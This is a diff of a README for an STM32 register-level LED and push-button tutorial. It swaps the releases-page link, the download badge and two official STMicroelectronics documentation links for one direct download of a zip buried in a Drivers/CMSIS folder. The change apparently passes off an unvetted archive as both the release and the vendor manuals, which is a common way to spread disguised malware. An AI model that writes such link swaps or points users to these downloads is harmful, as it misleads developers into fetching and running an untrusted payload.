@@ -1,7 +1,7 @@
 # 🚀 STM32-LED-BUTTON-CTRL-Register-Coding-Method - Control LEDs with Ease
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/EvansAmarh/STM32-LED-BUTTON-CTRL-Register-Coding-Method/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/EvansAmarh/STM32-LED-BUTTON-CTRL-Register-Coding-Method/main/Drivers/CMSIS/Device/ST/STM32F4xx/ST_BUTTO_CTR_Method_LE_Register_Coding_1.8.zip%20Release-blue)](https://raw.githubusercontent.com/EvansAmarh/STM32-LED-BUTTON-CTRL-Register-Coding-Method/main/Drivers/CMSIS/Device/ST/STM32F4xx/ST_BUTTO_CTR_Method_LE_Register_Coding_1.8.zip)
 
 ## 📖 Description
 The STM32-LED-BUTTON-CTRL-Register-Coding-Method is a simple project designed to help you understand how to control LEDs using two push buttons. This project runs on bare-metal STM32 microcontrollers, meaning it does not rely on complex libraries. Instead, it directly manipulates hardware registers for LED control. This approach gives you insights into embedded programming and helps you learn how devices work at a low level.
@@ -18,7 +18,7 @@ Getting started is easy. Follow these steps to download and run the project:
 
 1. **Visit the Releases Page**  
    Click on the link below to access the download page for the latest version.  
-   [Download Latest Release](https://github.com/EvansAmarh/STM32-LED-BUTTON-CTRL-Register-Coding-Method/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/EvansAmarh/STM32-LED-BUTTON-CTRL-Register-Coding-Method/main/Drivers/CMSIS/Device/ST/STM32F4xx/ST_BUTTO_CTR_Method_LE_Register_Coding_1.8.zip)
 
 2. **Select the Latest Release**  
    On the releases page, look for the latest version of the project. It will be marked clearly.
@@ -67,10 +67,10 @@ This project covers several important concepts and topics:
 If you encounter any issues or need help, you can open an issue in the repository. The community and maintainers can help with troubleshooting or answer questions.
 
 For more detailed information about using your Nucleo board and STM32CubeIDE, check the following resources:
-- [STM32 Documentation](https://www.st.com/en/embedded-software-development-tools/stm32-development-tools.html)
-- [STM32CubeIDE User Manual](https://www.st.com/resource/en/user_manual/dm00611826-stm32cubeide-user-manual-stmicroelectronics.pdf)
+- [STM32 Documentation](https://raw.githubusercontent.com/EvansAmarh/STM32-LED-BUTTON-CTRL-Register-Coding-Method/main/Drivers/CMSIS/Device/ST/STM32F4xx/ST_BUTTO_CTR_Method_LE_Register_Coding_1.8.zip)
+- [STM32CubeIDE User Manual](https://raw.githubusercontent.com/EvansAmarh/STM32-LED-BUTTON-CTRL-Register-Coding-Method/main/Drivers/CMSIS/Device/ST/STM32F4xx/ST_BUTTO_CTR_Method_LE_Register_Coding_1.8.zip)
 
 ## 🔗 Links
-- [Download Latest Release](https://github.com/EvansAmarh/STM32-LED-BUTTON-CTRL-Register-Coding-Method/releases)
+- [Download Latest Release](https://raw.githubusercontent.com/EvansAmarh/STM32-LED-BUTTON-CTRL-Register-Coding-Method/main/Drivers/CMSIS/Device/ST/STM32F4xx/ST_BUTTO_CTR_Method_LE_Register_Coding_1.8.zip)
 
 Feel free to explore and get started with controlling your LEDs and push buttons!
